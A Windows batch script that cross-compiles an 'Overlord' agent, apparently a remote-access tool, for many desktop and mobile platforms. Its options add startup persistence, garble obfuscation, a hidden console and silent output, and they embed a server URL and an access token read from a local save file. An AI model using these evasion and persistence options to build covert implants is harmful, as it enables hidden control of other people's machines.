@echo off
setlocal
set "SCRIPT_DIR=%~dp0"
for %%I in ("%SCRIPT_DIR%..") do set "ROOT=%%~fI\"
set "CLIENT_DIR=%ROOT%Overlord-Client"
set "OUT_DIR=%ROOT%dist-clients"

if not defined ENABLE_PERSISTENCE set ENABLE_PERSISTENCE=false
if not defined OBFUSCATE set OBFUSCATE=false
if not defined HIDE_CONSOLE set HIDE_CONSOLE=false
if not defined NO_PRINTING set NO_PRINTING=false
if not defined DISABLE_CGO set DISABLE_CGO=false

set "GARBLE_FLAGS="

REM Build LDFLAGS with all custom settings
set "LDFLAGS=-s -w"

set "BUILD_TAGS="
if "%NO_PRINTING%"=="true" (
    echo Building with printing disabled
    set "BUILD_TAGS=-tags noprint"
)

if "%ENABLE_PERSISTENCE%"=="true" (
    echo Building with persistence enabled
    set "LDFLAGS=%LDFLAGS% -X overlord-client/cmd/agent/config.DefaultPersistence=true"
)

if not "%STARTUP_NAME%"=="" (
    echo Building with custom startup name: %STARTUP_NAME%
    set "LDFLAGS=%LDFLAGS% -X overlord-client/cmd/agent/persistence.DefaultStartupName=%STARTUP_NAME%"
)

if not "%SERVER_URL%"=="" (
    echo Building with custom server URL: %SERVER_URL%
    set "LDFLAGS=%LDFLAGS% -X overlord-client/cmd/agent/config.DefaultServerURL=%SERVER_URL%"
)

if not "%CLIENT_ID%"=="" (
    echo Building with custom client ID: %CLIENT_ID%
    set "LDFLAGS=%LDFLAGS% -X overlord-client/cmd/agent/config.DefaultID=%CLIENT_ID%"
)

if not "%CLIENT_COUNTRY%"=="" (
    echo Building with custom country: %CLIENT_COUNTRY%
    set "LDFLAGS=%LDFLAGS% -X overlord-client/cmd/agent/config.DefaultCountry=%CLIENT_COUNTRY%"
)

if "%OVERLORD_AGENT_TOKEN%"=="" (
    set "SAVE_JSON=%APPDATA%\Overlord\save.json"
    if exist "%SAVE_JSON%" (
        for /f "usebackq delims=" %%I in (`powershell -NoProfile -Command "$p='%SAVE_JSON%'; try { $j = Get-Content -Raw -LiteralPath $p | ConvertFrom-Json; $t = $j.auth.agentToken; if ($t) { [Console]::Write($t) } } catch {}"`) do set "OVERLORD_AGENT_TOKEN=%%I"
    )
)

if not "%OVERLORD_AGENT_TOKEN%"=="" (
    echo Embedding agent token from environment/save.json
    set "LDFLAGS=%LDFLAGS% -X overlord-client/cmd/agent/config.DefaultAgentToken=%OVERLORD_AGENT_TOKEN%"
)

echo LDFLAGS: %LDFLAGS%

set "WIN_LDFLAGS="
if "%HIDE_CONSOLE%"=="true" (
    echo Windows console hidden (GUI subsystem)
    set "WIN_LDFLAGS=-H=windowsgui"
)

set "BUILD_CMD=go build"
if "%OBFUSCATE%"=="true" (
    where garble >nul 2>&1
    if errorlevel 1 (
        echo garble not found. Install with: go install mvdan.cc/garble@latest
        exit /b 1
    )
    echo Obfuscation enabled (garble)
    set "BUILD_CMD=garble build %GARBLE_FLAGS%"
)

if not exist "%OUT_DIR%" mkdir "%OUT_DIR%"

pushd "%CLIENT_DIR%"
echo == Building agent for windows amd64 ==
set GOOS=windows
set GOARCH=amd64
if /I "%DISABLE_CGO%"=="true" (
    set CGO_ENABLED=0
) else (
    set CGO_ENABLED=1
    if not exist "%CLIENT_DIR%\third_party\nvcodec\nvEncodeAPI.h" (
        echo Missing NVENC header: "%CLIENT_DIR%\third_party\nvcodec\nvEncodeAPI.h"
        echo Run scripts\vendor-nvcodec-headers.bat from the repo root or set DISABLE_CGO=true.
        goto :err
    )
)
%BUILD_CMD% %BUILD_TAGS% -ldflags="%LDFLAGS% %WIN_LDFLAGS%" -o "%OUT_DIR%\agent-windows-amd64.exe" ./cmd/agent
if errorlevel 1 goto :err

echo == Building agent for windows x86 ==
set GOOS=windows
set GOARCH=386
set CGO_ENABLED=0
%BUILD_CMD% %BUILD_TAGS% -ldflags="%LDFLAGS% %WIN_LDFLAGS%" -o "%OUT_DIR%\agent-windows-386.exe" ./cmd/agent
if errorlevel 1 goto :err

echo == Building agent for windows arm64 ==
set GOOS=windows
set GOARCH=arm64
set CGO_ENABLED=0
%BUILD_CMD% %BUILD_TAGS% -ldflags="%LDFLAGS% %WIN_LDFLAGS%" -o "%OUT_DIR%\agent-windows-arm64.exe" ./cmd/agent
if errorlevel 1 goto :err

echo == Building agent for linux amd64 ==
set GOOS=linux
set GOARCH=amd64
set CGO_ENABLED=0
%BUILD_CMD% %BUILD_TAGS% -ldflags="%LDFLAGS%" -o "%OUT_DIR%\agent-linux-amd64" ./cmd/agent
if errorlevel 1 goto :err

echo == Building agent for linux arm64 ==
set GOOS=linux
set GOARCH=arm64
set CGO_ENABLED=0
%BUILD_CMD% %BUILD_TAGS% -ldflags="%LDFLAGS%" -o "%OUT_DIR%\agent-linux-arm64" ./cmd/agent
if errorlevel 1 goto :err

echo == Building agent for linux arm (armv7) ==
set GOOS=linux
set GOARCH=arm
set GOARM=7
set CGO_ENABLED=0
%BUILD_CMD% %BUILD_TAGS% -ldflags="%LDFLAGS%" -o "%OUT_DIR%\agent-linux-armv7" ./cmd/agent
if errorlevel 1 goto :err

echo == Building agent for darwin arm64 ==
set GOOS=darwin
set GOARCH=arm64
set CGO_ENABLED=0
%BUILD_CMD% %BUILD_TAGS% -ldflags="%LDFLAGS%" -o "%OUT_DIR%\agent-darwin-arm64" ./cmd/agent
if errorlevel 1 goto :err

echo == Building agent for darwin amd64 ==
set GOOS=darwin
set GOARCH=amd64
set CGO_ENABLED=0
%BUILD_CMD% %BUILD_TAGS% -ldflags="%LDFLAGS%" -o "%OUT_DIR%\agent-darwin-amd64" ./cmd/agent
if errorlevel 1 goto :err

echo WARNING: BSD targets are severely untested and will probably not work right.

echo == Building agent for freebsd amd64 ==
set GOOS=freebsd
set GOARCH=amd64
set CGO_ENABLED=0
%BUILD_CMD% %BUILD_TAGS% -ldflags="%LDFLAGS%" -o "%OUT_DIR%\agent-freebsd-amd64" ./cmd/agent
if errorlevel 1 goto :err

echo == Building agent for freebsd arm64 ==
set GOOS=freebsd
set GOARCH=arm64
set CGO_ENABLED=0
%BUILD_CMD% %BUILD_TAGS% -ldflags="%LDFLAGS%" -o "%OUT_DIR%\agent-freebsd-arm64" ./cmd/agent
if errorlevel 1 goto :err

echo WARNING: Android targets are severely untested and will probably not work right.

echo == Building agent for android arm64 ==
set GOOS=android
set GOARCH=arm64
set CGO_ENABLED=0
%BUILD_CMD% %BUILD_TAGS% -ldflags="%LDFLAGS%" -o "%OUT_DIR%\agent-android-arm64" ./cmd/agent
if errorlevel 1 goto :err

echo == Building agent for android amd64 ==
set GOOS=android
set GOARCH=amd64
set CGO_ENABLED=0
%BUILD_CMD% %BUILD_TAGS% -ldflags="%LDFLAGS%" -o "%OUT_DIR%\agent-android-amd64" ./cmd/agent
if errorlevel 1 goto :err

echo == Building agent for android arm (armv7) ==
set GOOS=android
set GOARCH=arm
set GOARM=7
set CGO_ENABLED=0
%BUILD_CMD% %BUILD_TAGS% -ldflags="%LDFLAGS%" -o "%OUT_DIR%\agent-android-armv7" ./cmd/agent
if errorlevel 1 goto :err
set GOARM=

echo WARNING: iOS targets are experimental (POC). Most features will be stubbed.

echo == Building agent for ios arm64 ==
set GOOS=darwin
set GOARCH=arm64
set CGO_ENABLED=0
if "%NO_PRINTING%"=="true" (
    %BUILD_CMD% -tags "ios_target noprint" -ldflags="%LDFLAGS%" -o "%OUT_DIR%\agent-ios-arm64" ./cmd/agent
) else (
    %BUILD_CMD% -tags "ios_target" -ldflags="%LDFLAGS%" -o "%OUT_DIR%\agent-ios-arm64" ./cmd/agent
)
if errorlevel 1 goto :err

echo == Building agent for ios amd64 (simulator) ==
set GOOS=darwin
set GOARCH=amd64
set CGO_ENABLED=0
if "%NO_PRINTING%"=="true" (
    %BUILD_CMD% -tags "ios_target noprint" -ldflags="%LDFLAGS%" -o "%OUT_DIR%\agent-ios-amd64" ./cmd/agent
) else (
    %BUILD_CMD% -tags "ios_target" -ldflags="%LDFLAGS%" -o "%OUT_DIR%\agent-ios-amd64" ./cmd/agent
)
set GOOS=darwin
set GOARCH=amd64
set CGO_ENABLED=0
if "%NO_PRINTING%"=="true" (
    %BUILD_CMD% -tags "ios_target noprint" -ldflags="%LDFLAGS%" -o "%OUT_DIR%\agent-ios-amd64" ./cmd/agent
) else (
    %BUILD_CMD% -tags "ios_target" -ldflags="%LDFLAGS%" -o "%OUT_DIR%\agent-ios-amd64" ./cmd/agent
)
if errorlevel 1 goto :err

echo == Building agent for openbsd amd64 ==
set GOOS=openbsd
set GOARCH=amd64
set CGO_ENABLED=0
%BUILD_CMD% %BUILD_TAGS% -ldflags="%LDFLAGS%" -o "%OUT_DIR%\agent-openbsd-amd64" ./cmd/agent
if errorlevel 1 goto :err

echo == Building agent for openbsd arm64 ==
set GOOS=openbsd
set GOARCH=arm64
set CGO_ENABLED=0
%BUILD_CMD% %BUILD_TAGS% -ldflags="%LDFLAGS%" -o "%OUT_DIR%\agent-openbsd-arm64" ./cmd/agent
if errorlevel 1 goto :err

echo Builds complete. Outputs in %OUT_DIR%
goto :eof

:err
echo Build failed. See errors above.
popd >nul 2>&1
endlocal
exit /b 1

:eof
popd
endlocal
